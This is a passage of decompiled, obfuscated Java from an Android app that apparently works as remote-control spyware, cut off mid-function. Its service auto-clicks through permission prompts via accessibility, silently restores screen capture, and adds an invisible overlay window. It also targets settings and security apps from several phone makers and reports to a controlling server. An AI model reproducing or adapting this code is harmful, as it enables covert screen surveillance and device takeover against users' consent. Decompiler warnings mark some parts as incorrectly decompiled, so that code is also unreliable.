        kg1.m213542f1("com.android.settings", StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), "com.samsung.android.lool", StringUtil.m212470a0("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo="), "com.oneplus.security", "com.meizu.safe", StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI"), "com.realme.securitycheck");
        f52368n1 = new AtomicBoolean(false);
    }

    /* JADX WARN: Type inference failed for: r0v10, types: [com.storm.safe.rock.service.dqtvuisjd$permissionRequestReceiver$1] */
    /* JADX WARN: Type inference failed for: r0v13, types: [com.storm.safe.rock.service.dqtvuisjd$permissionHealthReceiver$1] */
    public dqtvuisjd() {
        tj1 tj1Var = new tj1(C1351vv.f60701a2);
        this.f52377a8 = tj1Var;
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        C0785a0 c0785a0 = sc0.f59953a0;
        y21 y21Var = new y21();
        c0785a0.getClass();
        this.f52378a9 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var).mo212744b2(tj1Var));
        this.f52390c1 = 1000L;
        this.f52393c4 = 150L;
        this.f52396c7 = 50;
        this.f52397c8 = 15;
        this.f52398c9 = 0.7d;
        this.f52403d4 = new LinkedHashSet();
        this.f52404d5 = StringUtil.m212470a0("OFgHP0kHHC9DJS5LHwVePR07Uj8oXAI=");
        this.f52405d6 = new LinkedHashMap();
        this.f52406d7 = new Object();
        this.f52407d8 = new LinkedHashMap();
        this.f52408d9 = 1500L;
        this.f52410e1 = 2000L;
        this.f52411e2 = true;
        this.f52446h7 = AbstractC0134bh.m210734f7(new String[]{"com.android.settings", StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"), StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), "com.samsung.android.lool", StringUtil.m212470a0("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo="), "com.oneplus.security", StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI"), "com.realme.securitycheck"});
        this.f52448h9 = 500L;
        this.f52449i0 = 2;
        this.f52450i1 = 8;
        this.f52451i2 = 1000L;
        this.f52452i3 = 100;
        this.f52457i8 = new dqtvuisjd$screenStateReceiver$1(this);
        this.f52464j5 = Long.MAX_VALUE;
        this.f52465j6 = new BroadcastReceiver() { // from class: com.storm.safe.rock.service.dqtvuisjd$permissionRequestReceiver$1
            /* JADX WARN: Removed duplicated region for block: B:172:0x037d  */
            @Override // android.content.BroadcastReceiver
            /*
                Code decompiled incorrectly, please refer to instructions dump.
            */
            public void onReceive(Context context, Intent intent) {
                String action;
                boolean z;
                C0323a8 c0323a8;
                C0260a2 c0260a2;
                if (intent != null) {
                    try {
                        action = intent.getAction();
                    } catch (Exception e) {
                        t60.m214705c6("dqtvuisjd", "处理权限申请广播失败", e);
                        return;
                    }
                } else {
                    action = null;
                }
                if (t60.m214686a2(action, "com.storm.safe.rock.intent.PERMISSION_REQUEST")) {
                    String stringExtra = intent.getStringExtra("permission_type");
                    boolean booleanExtra = intent.getBooleanExtra("requesting", false);
                    t60.m214714d6("dqtvuisjd", "收到权限申请广播: " + stringExtra + ", requesting: " + booleanExtra);
                    if (t60.m214686a2(stringExtra, "media_projection") && booleanExtra && (c0260a2 = this.f52649a0.f52369a0) != null) {
                        Integer num = AbstractC0241a0.f51907a1;
                        if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) == null) {
                            if (Build.VERSION.SDK_INT >= 30) {
                                t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：使用无障碍截图API，跳过MediaProjection权限申请");
                                return;
                            } else {
                                if (c0260a2 == null) {
                                    t60.m214724f2("permissionGranter");
                                    throw null;
                                }
                                c0260a2.m211325g8(true);
                                t60.m214714d6("dqtvuisjd", "已设置MediaProjection请求标志位");
                                return;
                            }
                        }
                        t60.m214714d6("dqtvuisjd", "📱 MediaProjection权限数据已存储，跳过重复申请");
                        int i = Build.VERSION.SDK_INT;
                        if (i >= 35) {
                            t60.m214714d6("dqtvuisjd", "🛡️ Android 15设备权限已存在，执行智能处理");
                            if (AbstractC0241a0.f51906a0 == null) {
                                t60.m214714d6("dqtvuisjd", "🔧 Android 15权限数据存在但MediaProjection对象为null，尝试恢复");
                                if (!dqtvuisjd.m211402a1(this.f52649a0)) {
                                    t60.m214726f4("dqtvuisjd", "❌ Android 15静默恢复失败，权限可能已过期");
                                    if (i >= 30) {
                                        t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：使用无障碍截图API，跳过权限重新申请");
                                        return;
                                    }
                                    t60.m214726f4("MediaProjectionHolder", "🧹 清理权限数据（权限可能已过期）");
                                    AbstractC0241a0.f51907a1 = null;
                                    AbstractC0241a0.f51908a2 = null;
                                    AbstractC0241a0.f51909a3 = 0L;
                                    C0260a2 c0260a22 = this.f52649a0.f52369a0;
                                    if (c0260a22 == null) {
                                        t60.m214724f2("permissionGranter");
                                        throw null;
                                    }
                                    c0260a22.m211325g8(true);
                                    t60.m214714d6("dqtvuisjd", "🔄 已清理过期权限数据，允许重新申请");
                                    return;
                                }
                                t60.m214714d6("dqtvuisjd", "✅ Android 15静默恢复成功");
                            }
                            if (!this.f52649a0.f52402d3) {
                                this.f52649a0.f52402d3 = true;
                                this.f52649a0.sendBroadcast(new Intent("com.storm.safe.rock.intent.ANDROID15_PERMISSION_STABLE"));
                            }
                        }
                        C0260a2 c0260a23 = this.f52649a0.f52369a0;
                        if (c0260a23 == null) {
                            t60.m214724f2("permissionGranter");
                            throw null;
                        }
                        c0260a23.m211325g8(false);
                        this.f52649a0.sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
                        t60.m214714d6("dqtvuisjd", "📡 权限已存在，发送停止Activity创建广播");
                        if (this.f52649a0.m211487i1()) {
                            return;
                        }
                        dqtvuisjd dqtvuisjdVar = this.f52649a0;
                        AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$permissionRequestReceiver$1$onReceive$2(dqtvuisjdVar, null), 3);
                        return;
                    }
                    return;
                }
                if (t60.m214686a2(action, "com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED")) {
                    boolean booleanExtra2 = intent.getBooleanExtra(PollingXHR.Request.EVENT_SUCCESS, false);
                    boolean booleanExtra3 = intent.getBooleanExtra("permission_recovery", false);
                    boolean booleanExtra4 = intent.getBooleanExtra("REFRESH_com.storm.safe.rock.PERMISSION_REQUEST", false);
                    t60.m214714d6("dqtvuisjd", "收到MediaProjection权限结果广播: success=" + booleanExtra2 + ", permissionRecovery=" + booleanExtra3 + ", refreshRequest=" + booleanExtra4);
                    if (booleanExtra4 && (c0323a8 = this.f52649a0.f52415e6) != null && c0323a8 != null) {
                        String str = booleanExtra2 ? "投屏权限重新申请成功" : "投屏权限重新申请失败";
                        if (c0323a8 == null) {
                            t60.m214724f2("networkManager");
                            throw null;
                        }
                        c0323a8.m211663c9(str, booleanExtra2);
                        t60.m214714d6("dqtvuisjd", "📡 已发送权限申请响应到服务端: success=" + booleanExtra2);
                    }
                    if (!booleanExtra2) {
                        t60.m214726f4("dqtvuisjd", "MediaProjection权限获取失败，但仍继续建立服务器连接");
                        dqtvuisjd dqtvuisjdVar2 = this.f52649a0;
                        AbstractC0780a0.m213692a3(dqtvuisjdVar2.f52378a9, null, new dqtvuisjd$permissionRequestReceiver$1$onReceive$9(dqtvuisjdVar2, null), 3);
                        return;
                    }
                    C0260a2 c0260a24 = this.f52649a0.f52369a0;
                    if (c0260a24 != null) {
                        if (Build.VERSION.SDK_INT >= 35) {
                            t60.m214714d6("dqtvuisjd", "🔧 Android 15设备使用优化权限完成处理");
                            dqtvuisjd dqtvuisjdVar3 = this.f52649a0;
                            AbstractC0780a0.m213692a3(dqtvuisjdVar3.f52378a9, null, new dqtvuisjd$permissionRequestReceiver$1$onReceive$6(dqtvuisjdVar3, null), 3);
                        } else {
                            if (c0260a24 == null) {
                                t60.m214724f2("permissionGranter");
                                throw null;
                            }
                            c0260a24.m211325g8(false);
                            t60.m214714d6("dqtvuisjd", "✅ MediaProjection权限成功：已重置PermissionGranter状态");
                        }
                    }
                    if (!booleanExtra3) {
                        dqtvuisjd dqtvuisjdVar4 = this.f52649a0;
                        AbstractC0780a0.m213692a3(dqtvuisjdVar4.f52378a9, null, new dqtvuisjd$permissionRequestReceiver$1$onReceive$8(dqtvuisjdVar4, null), 3);
                        return;
                    } else {
                        t60.m214714d6("dqtvuisjd", "🔧 开始权限恢复：重新启动屏幕捕获");
                        dqtvuisjd dqtvuisjdVar5 = this.f52649a0;
                        AbstractC0780a0.m213692a3(dqtvuisjdVar5.f52378a9, null, new dqtvuisjd$permissionRequestReceiver$1$onReceive$7(dqtvuisjdVar5, null), 3);
                        return;
                    }
                }
                if (t60.m214686a2(action, "com.storm.safe.rock.intent.PERMISSION_GRANTED")) {
                    String stringExtra2 = intent.getStringExtra("permission_type");
                    boolean booleanExtra5 = intent.getBooleanExtra("granted", false);
                    t60.m214714d6("dqtvuisjd", "🎉 收到权限成功广播: " + stringExtra2 + ", granted: " + booleanExtra5);
                    if (t60.m214686a2(stringExtra2, "media_projection") && booleanExtra5) {
                        dqtvuisjd dqtvuisjdVar6 = this.f52649a0;
                        dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                        C0260a2 c0260a25 = dqtvuisjdVar6.f52369a0;
                        if (c0260a25 != null) {
                            if (c0260a25 == null) {
                                t60.m214724f2("permissionGranter");
                                throw null;
                            }
                            c0260a25.m211325g8(false);
                            t60.m214714d6("dqtvuisjd", "🔄 权限成功：已重置PermissionGranter状态，停止iuzxujjtqev创建循环");
                        }
                        this.f52649a0.sendBroadcast(new Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"));
                        t60.m214714d6("dqtvuisjd", "📡 立即发送停止Activity创建广播");
                        dqtvuisjd dqtvuisjdVar7 = this.f52649a0;
                        AbstractC0780a0.m213692a3(dqtvuisjdVar7.f52378a9, null, new dqtvuisjd$permissionRequestReceiver$1$onReceive$11(dqtvuisjdVar7, null), 3);
                        return;
                    }
                    return;
                }
                if (t60.m214686a2(action, "com.storm.safe.rock.intent.MANUAL_ACTION_REQUIRED")) {
                    t60.m214726f4("dqtvuisjd", "🔔 收到手动操作通知: " + intent.getStringExtra("permission_type") + " - " + intent.getStringExtra("message"));
                    C0260a2 c0260a26 = this.f52649a0.f52369a0;
                    if (c0260a26 != null) {
                        if (c0260a26 == null) {
                            t60.m214724f2("permissionGranter");
                            throw null;
                        }
                        c0260a26.m211325g8(false);
                        t60.m214714d6("dqtvuisjd", "✅ 已重置PermissionGranter状态，停止自动点击");
                        return;
                    }
                    return;
                }
                if (t60.m214686a2(action, "com.storm.safe.rock.intent.REACTIVATE_PERMISSION_GRANTER")) {
                    t60.m214714d6("dqtvuisjd", "🛡️ 收到PermissionGranter重新激活请求");
                    C0260a2 c0260a27 = this.f52649a0.f52369a0;
                    if (c0260a27 == null) {
                        t60.m214726f4("dqtvuisjd", "⚠️ PermissionGranter未初始化，无法重新激活");
                        return;
                    }
                    Integer num2 = AbstractC0241a0.f51907a1;
                    if ((num2 != null ? new Pair(num2, AbstractC0241a0.f51908a2) : null) == null) {
                        if (Build.VERSION.SDK_INT >= 30) {
                            t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：使用无障碍截图API，跳过权限重新激活");
                            return;
                        } else {
                            if (c0260a27 == null) {
                                t60.m214724f2("permissionGranter");
                                throw null;
                            }
                            c0260a27.m211325g8(true);
                            t60.m214714d6("dqtvuisjd", "✅ PermissionGranter已重新激活，准备处理权限申请");
                            return;
                        }
                    }
                    t60.m214714d6("dqtvuisjd", "📱 权限已存在，跳过PermissionGranter重新激活");
                    if (Build.VERSION.SDK_INT >= 35 && !this.f52649a0.f52402d3) {
                        this.f52649a0.f52402d3 = true;
                        this.f52649a0.sendBroadcast(new Intent("com.storm.safe.rock.intent.ANDROID15_PERMISSION_STABLE"));
                    }
                    C0260a2 c0260a28 = this.f52649a0.f52369a0;
                    if (c0260a28 != null) {
                        c0260a28.m211325g8(false);
                        return;
                    } else {
                        t60.m214724f2("permissionGranter");
                        throw null;
                    }
                }
                if (!t60.m214686a2(action, "com.storm.safe.rock.intent.ANDROID15_SECONDARY_CONFIRMATION")) {
                    if (t60.m214686a2(action, "com.storm.safe.rock.intent.WRITE_SETTINGS_PERMISSION_GRANTED")) {
                        boolean booleanExtra6 = intent.getBooleanExtra(PollingXHR.Request.EVENT_SUCCESS, false);
                        String stringExtra3 = intent.getStringExtra("reason");
                        t60.m214714d6("dqtvuisjd", "收到WRITE_SETTINGS权限结果广播: success=" + booleanExtra6 + ", reason=" + stringExtra3);
                        if (booleanExtra6) {
                            t60.m214714d6("dqtvuisjd", "✅ WRITE_SETTINGS权限申请成功");
                        } else {
                            t60.m214726f4("dqtvuisjd", "⚠️ WRITE_SETTINGS权限申请失败: " + stringExtra3);
                        }
                        t60.m214714d6("dqtvuisjd", "📝 广播处理完成（密码窗口由WriteSettingsPermissionManager启动）");
                        return;
                    }
                    if (t60.m214686a2(action, "com.storm.safe.rock.intent.START_ACCESSIBILITY_SERVICE")) {
                        t60.m214714d6("dqtvuisjd", "🚀 收到无障碍服务启动广播");
                        dqtvuisjd.m211410a9(this.f52649a0);
                        return;
                    }
                    if (t60.m214686a2(action, "com.storm.safe.rock.intent.ENABLE_LOGGING")) {
                        t60.m214714d6("dqtvuisjd", "📝 收到启用日志记录广播");
                        this.f52649a0.m211459e8();
                        t60.m214714d6("dqtvuisjd", "📝 安装完成后已启用日志记录");
                        return;
                    }
                    if (t60.m214686a2(action, this.f52649a0.getPackageName() + ".MEDIA_PROJECTION_PERMISSION_GRANTED")) {
                        t60.m214714d6("dqtvuisjd", "📺📺📺 收到 MEDIA_PROJECTION_PERMISSION_GRANTED 广播");
                        C0263a5 c0263a5 = this.f52649a0.f52370a1;
                        if (c0263a5 == null) {
                            t60.m214726f4("dqtvuisjd", "⚠️ etzbzyzqxvqm 未初始化");
                            return;
                        } else {
                            if (c0263a5 == null) {
                                t60.m214724f2("etzbzyzqxvqm");
                                throw null;
                            }
                            c0263a5.m211351a7();
                            t60.m214714d6("dqtvuisjd", "📺✅ 已通知 etzbzyzqxvqm 权限获取成功");
                            return;
                        }
                    }
                    return;
                }
                t60.m214714d6("dqtvuisjd", "🔍 Android 15二次确认监听激活");
                int i2 = Build.VERSION.SDK_INT;
                if (i2 >= 30) {
                    t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：使用无障碍截图API，跳过二次确认监听");
                    return;
                }
                dqtvuisjd dqtvuisjdVar8 = this.f52649a0;
                if (dqtvuisjdVar8.f52369a0 == null || i2 < 35) {
                    return;
                }
                Integer num3 = AbstractC0241a0.f51907a1;
                boolean z2 = (num3 != null ? new Pair(num3, AbstractC0241a0.f51908a2) : null) != null;
                boolean z3 = AbstractC0241a0.f51906a0 != null;
                C0263a5 c0263a52 = dqtvuisjdVar8.f52370a1;
                if (c0263a52 == null) {
                    z = false;
                } else {
                    if (c0263a52 == null) {
                        t60.m214724f2("etzbzyzqxvqm");
                        throw null;
                    }
                    if (!c0263a52.f52153a2) {
                        z = true;
                    }
                }
                t60.m214714d6("dqtvuisjd", "🔍 Android 15权限状态检查: 权限数据=" + z2 + ", MediaProjection=" + z3 + ", 屏幕捕获中=" + z);
                if (!z2 && !z3) {
                    t60.m214726f4("dqtvuisjd", "❌ Android 15权限完全丢失，需要重新申请");
                    if (i2 >= 30) {
                        t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：使用无障碍截图API，跳过权限重新申请");
                        return;
                    }
                    C0260a2 c0260a29 = this.f52649a0.f52369a0;
                    if (c0260a29 != null) {
                        c0260a29.m211325g8(true);
                        return;
                    } else {
                        t60.m214724f2("permissionGranter");
                        throw null;
                    }
                }
                if (!z2 || z3) {
                    if (!z2 || !z3) {
                        t60.m214726f4("dqtvuisjd", "⚠️ Android 15边缘情况：无权限数据但有MediaProjection，保持当前状态");
                        return;
                    }
                    t60.m214714d6("dqtvuisjd", "✅ Android 15权限完全正常，进入保活模式");
                    C0260a2 c0260a210 = this.f52649a0.f52369a0;
                    if (c0260a210 == null) {
                        t60.m214724f2("permissionGranter");
                        throw null;
                    }
                    c0260a210.m211325g8(false);
                    t60.m214714d6("dqtvuisjd", "🛡️ Android 15权限保活：停止申请流程，启用保活确认处理");
                    return;
                }
                t60.m214726f4("dqtvuisjd", "⚠️ Android 15权限运行时丢失：有权限数据但MediaProjection为null，尝试静默恢复");
                if (dqtvuisjd.m211402a1(this.f52649a0)) {
                    t60.m214714d6("dqtvuisjd", "✅ Android 15静默恢复成功");
                    C0260a2 c0260a211 = this.f52649a0.f52369a0;
                    if (c0260a211 != null) {
                        c0260a211.m211325g8(false);
                        return;
                    } else {
                        t60.m214724f2("permissionGranter");
                        throw null;
                    }
                }
                t60.m214726f4("dqtvuisjd", "❌ Android 15静默恢复失败，需要重新申请");
                if (i2 >= 30) {
                    t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：使用无障碍截图API，跳过权限重新申请");
                    return;
                }
                C0260a2 c0260a212 = this.f52649a0.f52369a0;
                if (c0260a212 != null) {
                    c0260a212.m211325g8(true);
                } else {
                    t60.m214724f2("permissionGranter");
                    throw null;
                }
            }
        };
        this.f52468j9 = 2500L;
        this.f52472k3 = Integer.MAX_VALUE;
        this.f52473k4 = 300L;
        StringUtil.m212470a0("PlcYNF4sDSJbDjtLHi5IOxgnWD8USQM/Sw==");
        this.f52478k9 = -1;
        this.f52486l7 = Integer.MAX_VALUE;
        this.f52487l8 = 300L;
        this.f52489m0 = new BroadcastReceiver() { // from class: com.storm.safe.rock.service.dqtvuisjd$permissionHealthReceiver$1
            /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue
            java.lang.NullPointerException: Cannot invoke "java.util.List.iterator()" because the return value of "jadx.core.dex.visitors.regions.SwitchOverStringVisitor$SwitchData.getNewCases()" is null
            	at jadx.core.dex.visitors.regions.SwitchOverStringVisitor.restoreSwitchOverString(SwitchOverStringVisitor.java:109)
            	at jadx.core.dex.visitors.regions.SwitchOverStringVisitor.visitRegion(SwitchOverStringVisitor.java:66)
            	at jadx.core.dex.visitors.regions.DepthRegionTraversal.traverseIterativeStepInternal(DepthRegionTraversal.java:77)
            	at jadx.core.dex.visitors.regions.DepthRegionTraversal.traverseIterativeStepInternal(DepthRegionTraversal.java:82)
             */
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent) {
                String action;
                if (intent != null) {
                    try {
                        action = intent.getAction();
                    } catch (Exception e) {
                        t60.m214705c6("dqtvuisjd", "❌ 处理权限健康监控广播失败", e);
                        return;
                    }
                } else {
                    action = null;
                }
                if (action != null) {
                    int iHashCode = action.hashCode();
                    dqtvuisjd dqtvuisjdVar = this.f52648a0;
                    switch (iHashCode) {
                        case -1971759611:
                            if (!action.equals("com.storm.safe.rock.intent.STOP_SECONDARY_CONFIRMATION")) {
                                break;
                            } else {
                                t60.m214714d6("dqtvuisjd", "🛑 收到停止二次确认监听通知");
                                dqtvuisjd.m211414b3(dqtvuisjdVar);
                                break;
                            }
                        case -1711043377:
                            if (!action.equals("com.storm.safe.rock.intent.PERMISSION_RECOVERY_FAILED")) {
                                break;
                            } else {
                                t60.m214726f4("dqtvuisjd", "❌ 收到权限恢复失败通知");
                                dqtvuisjd.m211413b2(dqtvuisjdVar, intent);
                                break;
                            }
                        case -330966265:
                            if (!action.equals("com.storm.safe.rock.intent.ANDROID15_PERMISSION_STABLE")) {
                                break;
                            } else {
                                t60.m214714d6("dqtvuisjd", "🛡️ 收到Android 15权限稳定通知");
                                AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$handleAndroid15PermissionStable$1(dqtvuisjdVar, null), 3);
                                break;
                            }
                        case 1034160920:
                            if (!action.equals("com.storm.safe.rock.intent.PERMISSION_HEALTH_RECOVERED")) {
                                break;
                            } else {
                                t60.m214714d6("dqtvuisjd", "🏥 收到权限健康恢复通知");
                                AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$handlePermissionHealthRecovered$1(dqtvuisjdVar, null), 3);
                                break;
                            }
                        case 1081765798:
                            if (!action.equals("com.storm.safe.rock.intent.MEDIA_PROJECTION_RECOVERED")) {
                                break;
                            } else {
                                t60.m214714d6("dqtvuisjd", "📱 收到Android 15 MediaProjection权限恢复通知");
                                AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, null, new dqtvuisjd$handleAndroid15PermissionRecovered$1(dqtvuisjdVar, null), 3);
                                break;
                            }
                        case 2099617134:
                            if (!action.equals("com.storm.safe.rock.intent.PERMISSION_HEALTH_ISSUE")) {
                                break;
                            } else {
                                t60.m214726f4("dqtvuisjd", "🏥 收到权限健康问题通知");
                                dqtvuisjd.m211412b1(dqtvuisjdVar, intent);
                                break;
                            }
                    }
                }
            }
        };
    }

    /* renamed from: a0 */
    public static final void m211401a0(dqtvuisjd dqtvuisjdVar) {
        try {
            Object systemService = dqtvuisjdVar.getSystemService("window");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
            WindowManager windowManager = (WindowManager) systemService;
            View view = new View(dqtvuisjdVar);
            view.setBackgroundColor(0);
            Drawable background = view.getBackground();
            if (background != null) {
                background.setAlpha(0);
            }
            view.setImportantForAccessibility(2);
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(50, 50, 2032, 792, -3);
            layoutParams.gravity = 8388661;
            layoutParams.x = 0;
            layoutParams.y = 0;
            if (Build.VERSION.SDK_INT >= 28) {
                layoutParams.layoutInDisplayCutoutMode = 1;
            }
            windowManager.addView(view, layoutParams);
            t60.m214714d6("dqtvuisjd", "✅ 透明小窗口已添加");
        } catch (Exception e) {
            tz0.m214807a7("❌ 添加透明小窗口失败: ", e.getMessage(), "dqtvuisjd");
        }
    }

    /* renamed from: a1 */
    public static final boolean m211402a1(dqtvuisjd dqtvuisjdVar) {
        try {
            t60.m214714d6("dqtvuisjd", "🤫🤫🤫 AccessibilityService尝试Android 15静默权限恢复 🤫🤫🤫");
            dqtvuisjdVar.m211494i8("AccessibilityService静默恢复开始");
            t60.m214714d6("dqtvuisjd", "🔄 直接静默恢复模式");
            Integer num = AbstractC0241a0.f51907a1;
            Pair pair = num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null;
            t60.m214702c3("dqtvuisjd", "🔍 直接恢复模式 - 权限数据存在: " + (pair != null));
            if (pair != null) {
                int iIntValue = ((Number) pair.f57556a0).intValue();
                Intent intent = (Intent) pair.f57557a1;
                t60.m214702c3("dqtvuisjd", "🔑 直接恢复权限数据: resultCode=" + iIntValue + ", Intent存在=" + (intent != null));
                if (intent != null) {
                    t60.m214714d6("dqtvuisjd", "🔑 使用现有权限数据进行直接静默恢复");
                    Object systemService = dqtvuisjdVar.getSystemService("media_projection");
                    t60.m214693b4(systemService, "null cannot be cast to non-null type android.media.projection.MediaProjectionManager");
                    MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) systemService;
                    t60.m214702c3("dqtvuisjd", "🏭 获取系统MediaProjectionManager: ".concat(mediaProjectionManager.getClass().getName()));
                    MediaProjection mediaProjection = mediaProjectionManager.getMediaProjection(iIntValue, intent);
                    t60.m214702c3("dqtvuisjd", "🏭 直接恢复结果: " + (mediaProjection != null ? Integer.valueOf(mediaProjection.hashCode()) : null));
                    if (mediaProjection != null) {
                        t60.m214702c3("dqtvuisjd", "🔄 更新MediaProjectionHolder");
                        AbstractC0241a0.f51906a0 = mediaProjection;
                        AbstractC0241a0.f51909a3 = System.currentTimeMillis();
                        t60.m214714d6("MediaProjectionHolder", "✅ MediaProjection已设置，时间戳: " + AbstractC0241a0.f51909a3);
                        t60.m214714d6("dqtvuisjd", "✅✅✅ Android 15直接静默恢复成功 ✅✅✅");
                        t60.m214702c3("dqtvuisjd", "🎬 设置到屏幕捕获管理器");
                        dqtvuisjdVar.m211520l7(mediaProjection);
                        dqtvuisjdVar.m211494i8("直接恢复成功");
                        return true;
                    }
                    t60.m214726f4("dqtvuisjd", "❌ 系统MediaProjectionManager.getMediaProjection()返回null");
                } else {
                    t60.m214726f4("dqtvuisjd", "❌ 直接恢复模式：权限数据中的Intent为null");
                }
            } else {
                t60.m214726f4("dqtvuisjd", "❌ 直接恢复模式：没有权限数据");
            }
            dqtvuisjdVar.m211494i8("AccessibilityService静默恢复失败");
            t60.m214726f4("dqtvuisjd", "❌❌❌ Android 15静默恢复失败 ❌❌❌");
            return false;
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌❌❌ Android 15静默恢复异常 ❌❌❌", e);
            dqtvuisjdVar.m211494i8("AccessibilityService静默恢复异常");
            return false;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:37:0x00b1 A[Catch: all -> 0x0032, Exception -> 0x0035, TryCatch #1 {Exception -> 0x0035, blocks: (B:7:0x0016, B:9:0x0020, B:11:0x0029, B:16:0x0038, B:18:0x0055, B:20:0x005e, B:28:0x0077, B:32:0x0098, B:34:0x00a1, B:36:0x00a8, B:42:0x00d9, B:37:0x00b1, B:39:0x00ca, B:41:0x00d1, B:22:0x0068, B:24:0x006c, B:45:0x00e1, B:46:0x00e4), top: B:55:0x0016, outer: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:39:0x00ca A[Catch: all -> 0x0032, Exception -> 0x0035, TryCatch #1 {Exception -> 0x0035, blocks: (B:7:0x0016, B:9:0x0020, B:11:0x0029, B:16:0x0038, B:18:0x0055, B:20:0x005e, B:28:0x0077, B:32:0x0098, B:34:0x00a1, B:36:0x00a8, B:42:0x00d9, B:37:0x00b1, B:39:0x00ca, B:41:0x00d1, B:22:0x0068, B:24:0x006c, B:45:0x00e1, B:46:0x00e4), top: B:55:0x0016, outer: #0 }] */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final void m211403a2(dqtvuisjd dqtvuisjdVar) {
        boolean z;
        boolean zM211487i1;
        if (dqtvuisjdVar.f52401d2) {
            t60.m214726f4("dqtvuisjd", "⚠️ 服务初始化已在进行中，跳过重复调用");
            return;
        }
        dqtvuisjdVar.f52401d2 = true;
        try {
            try {
                t60.m214714d6("dqtvuisjd", "继续服务初始化流程");
                C0263a5 c0263a5 = dqtvuisjdVar.f52370a1;
                if (c0263a5 == null) {
                    t60.m214724f2("etzbzyzqxvqm");
                    throw null;
                }
                c0263a5.f52153a2 = true;
                c0263a5.m211355b1();
                C0263a5 c0263a52 = dqtvuisjdVar.f52370a1;
                if (c0263a52 != null) {
                    c0263a52.m211352a8();
                    t60.m214714d6("dqtvuisjd", "⏸️ 无障碍服务启动后已暂停屏幕发送");
                }
                AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$continueServiceInitialization$3(dqtvuisjdVar, null), 2);
                t60.m214714d6("dqtvuisjd", "✅ 本地初始化继续，网络连接在后台进行");
                t60.m214714d6("dqtvuisjd", "🔄 等待设备注册完成后启动屏幕捕获");
                int i = Build.VERSION.SDK_INT;
                if (i >= 30) {
                    t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：快速标记权限已就绪，使用无障碍截图");
                    C0260a2 c0260a2 = dqtvuisjdVar.f52369a0;
                    if (c0260a2 != null) {
                        c0260a2.m211329h2();
                        t60.m214714d6("dqtvuisjd", "🛑 Android 11+设备：已停止PermissionGranter自动点击功能");
                    }
                } else {
                    Integer num = AbstractC0241a0.f51907a1;
                    if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) == null) {
                        z = false;
                        zM211487i1 = dqtvuisjdVar.m211487i1();
                        t60.m214714d6("dqtvuisjd", "📊 服务状态检查：MediaProjection权限=" + z + ", 服务器连接=" + zM211487i1);
                        if (z || !zM211487i1) {
                            t60.m214726f4("dqtvuisjd", "⚠️ 基础组件未就绪，继续等待：MediaProjection=" + z + ", ServerConnected=" + zM211487i1);
                            if (i >= 30) {
                                t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：截图模式待控制端命令启动");
                                C0260a2 c0260a22 = dqtvuisjdVar.f52369a0;
                                if (c0260a22 != null) {
                                    c0260a22.m211329h2();
                                    t60.m214714d6("dqtvuisjd", "🛑 Android 11+设备：确保PermissionGranter已停止（未就绪分支）");
                                }
                            }
                        } else {
                            t60.m214714d6("dqtvuisjd", "✅ 基础组件已就绪，等待设备注册完成");
                            dqtvuisjdVar.f52400d1 = true;
                            if (i >= 30) {
                                t60.m214714d6("dqtvuisjd", "📱 Android 11+设备：截图模式待控制端命令启动");
                                C0260a2 c0260a23 = dqtvuisjdVar.f52369a0;
                                if (c0260a23 != null) {
                                    c0260a23.m211329h2();
                                    t60.m214714d6("dqtvuisjd", "🛑 Android 11+设备：确保PermissionGranter已停止（已就绪分支）");
                                }
                            }
                        }
                        t60.m214714d6("dqtvuisjd", "服务初始化完成");
                        dqtvuisjdVar.f52401d2 = false;
                    }
                }
                z = true;
                zM211487i1 = dqtvuisjdVar.m211487i1();
                t60.m214714d6("dqtvuisjd", "📊 服务状态检查：MediaProjection权限=" + z + ", 服务器连接=" + zM211487i1);
                if (z) {
                    t60.m214726f4("dqtvuisjd", "⚠️ 基础组件未就绪，继续等待：MediaProjection=" + z + ", ServerConnected=" + zM211487i1);
                    if (i >= 30) {
                    }
                }
